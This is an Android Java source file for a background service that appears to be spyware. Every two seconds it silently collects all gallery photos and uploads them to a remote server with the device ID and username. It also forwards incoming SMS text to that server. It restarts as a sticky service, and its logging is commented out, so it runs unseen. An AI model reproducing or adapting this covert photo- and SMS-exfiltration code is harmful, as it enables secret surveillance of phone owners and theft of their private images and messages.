package org.jesusgift.clienttest;
 /* *
 * Developed By : Victor Vincent
 * Created On : 09/06/16
 * victorvprem@gmail.com
 * Kliotech Pvt Ltd.0
 * */

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.IBinder;
import android.support.annotation.Nullable;

import org.jesusgift.clienttest.Helpers.AppConfig;
import org.jesusgift.clienttest.Helpers.DBManager;
import org.jesusgift.clienttest.Helpers.MyUtility;
import org.jesusgift.clienttest.Interface.ApiService;
import org.jesusgift.clienttest.Model.ApiResponse;
import org.jesusgift.clienttest.Model.ImageHolder;

import java.io.File;
import java.util.HashMap;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.RequestBody;
import okhttp3.logging.HttpLoggingInterceptor;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public class ClientService extends Service {
    private static final String TAG = "ClientService";
    private Timer timer;
    private boolean READY_TO_RUN = true;
    private DBManager dbManager;
    private Retrofit retrofit;

    @Override
    public void onCreate() {
        super.onCreate();
        AppConfig.IS_SERVICE_RUNNING = true;
        //Log.i(TAG, "Service Started");

        //Initialising Database
        dbManager = new DBManager(this, null, null, AppConfig.DB_VERSION);

        //int c = MyUtility.getGalleryImagesCount(ClientService.this);
        //Log.d(TAG, "GALLERY COUNT : "+c);

        //Initialising Timer Controls
        initTimer();
    }

    /**
     * Initialising Timer Controls
     * */
    private void initTimer() {
        timer = new Timer();
        timer.scheduleAtFixedRate(timerTask, 0, 2000);
    }

    /**
     * Timer Task to Check for Data
     * */
    private TimerTask timerTask = new TimerTask() {
        @Override
        public void run() {
            //Log.d(TAG, "Service Running");
            if(MyUtility.isOnline(ClientService.this)) {
                //Log.d(TAG, "Device Online");
                if(READY_TO_RUN) {
                    processMediaStore();
                }
            }
        }
    };

    /**
     * Function Block to process media store
     * */
    private void processMediaStore() {
        final MediaType TYPE_IMAGE = MediaType.parse("image/*");
        Map<String, RequestBody> reqMap = new HashMap<>();

        try (Cursor c = MyUtility.getAllGalleryImages(ClientService.this, dbManager.getMediaIdsAsCommaSeperated())) {
            //initialising Retrofit Services
            initRetrofitService();

            if(c != null && c.getCount() > 0) {
                //looping through cursor
                while(c.moveToNext()) {
                    if (!dbManager.isMediaPresent(c.getString(0))) {
                        File f = new File(c.getString(1));

                        if (f.exists()) {
                            Bitmap bmp = MyUtility.decodeFile(f);
                            File file = MyUtility.storeImage(bmp, getCacheDir());

                            if (file != null && file.exists()) {
                                RequestBody req = RequestBody.create(TYPE_IMAGE, file);
                                reqMap.put("picture_" + c.getString(0) + "\"; filename=\"" + c.getString(0), req);
                            }
                        }
                    } else {
                        //Log.i(TAG, "MEDIA " + c.getString(0) + " ALREADY UPLOADED!");
                    }
                }

                if(reqMap.size() > 0) {
                    ImageHolder imageHolder = new ImageHolder(reqMap);
                    new ImageUploadTask().execute(imageHolder);
                }
            }

        }
    }

    /**
     * Function to initialise Retrofit services
     * */
    private void initRetrofitService() {
        HttpLoggingInterceptor interceptor = new HttpLoggingInterceptor();
        interceptor.setLevel(HttpLoggingInterceptor.Level.HEADERS);

        OkHttpClient client = new OkHttpClient.Builder()
                .connectTimeout(10, TimeUnit.SECONDS)
                .writeTimeout(10, TimeUnit.SECONDS)
                .readTimeout(60, TimeUnit.SECONDS)
                .build();

        retrofit = new Retrofit.Builder()
                .baseUrl(AppConfig.API_BASE_URL)
                .client(client)
                .addConverterFactory(GsonConverterFactory.create())
                .build();
    }

    /**
     * ImageUpload Background Thread
     * */
    class ImageUploadTask extends AsyncTask<ImageHolder, Void, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            READY_TO_RUN = false;
        }

        @Override
        protected Void doInBackground(ImageHolder... params) {
            Map<String, RequestBody> parts = params[0].requestBodyMap;
            ApiService apiService = retrofit.create(ApiService.class);
            Call<ApiResponse> responseCall = apiService.saveImages(parts, MyUtility.getDeviceId(ClientService.this), MyUtility.getUsername(ClientService.this));
            responseCall.enqueue(apiCallback);
            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
        }
    }

    /**
     * Callback function for Retrofit Response
     * @param MyResponse
     * */
    Callback<ApiResponse> apiCallback = new Callback<ApiResponse>() {
        @Override
        public void onResponse(Call<ApiResponse> call, Response<ApiResponse> response) {
            //Log.i(TAG, "SUC : "+response.code());
            if(response.code() == 200){
                if(dbManager.insertMedia(response.body().getData())) {
                    MyUtility.clearCacheDir(getCacheDir());
                    READY_TO_RUN = true;
                }
            }
        }

        @Override
        public void onFailure(Call<ApiResponse> call, Throwable t) {
            READY_TO_RUN = true;
            //Log.e(TAG,"ERR : "+t.getMessage());
        }
    };


    /**
     * Background Async Task for Posting SMS
     * */
    public class SmsTask extends AsyncTask<String, Void, Void> {

        @Override
        protected Void doInBackground(String... params) {
            String sms = params[0];
            ApiService apiService = retrofit.create(ApiService.class);
            Call<ApiResponse> res = apiService.postSms(sms, MyUtility.getDeviceId(ClientService.this), MyUtility.getUsername(ClientService.this));
            res.enqueue(apiCallback);
            return null;
        }
    }

    /**
     * Client Service On Start Command
     * */
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if(intent != null) {
            Bundle extras = intent.getExtras();
            if(extras != null) {
                if(extras.containsKey(AppConfig.MESSAGE_BODY)){
                    String msg = intent.getExtras().getString(AppConfig.MESSAGE_BODY);
                    if(MyUtility.isOnline(ClientService.this)) {
                        new SmsTask().execute(msg);
                    }
                }
            }
        }
        return START_STICKY;
    }

    /**
     * Client Service On Destroy
     * */
    @Override
    public void onDestroy() {
        super.onDestroy();
        timer.cancel();
        AppConfig.IS_SERVICE_RUNNING = false;

        Intent intent = new Intent();
        intent.setAction(AppConfig.SERVICE_STOP_BROADCAST);
        sendBroadcast(intent);
    }

    /**
     * Client Service Activity Binder
     * */
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
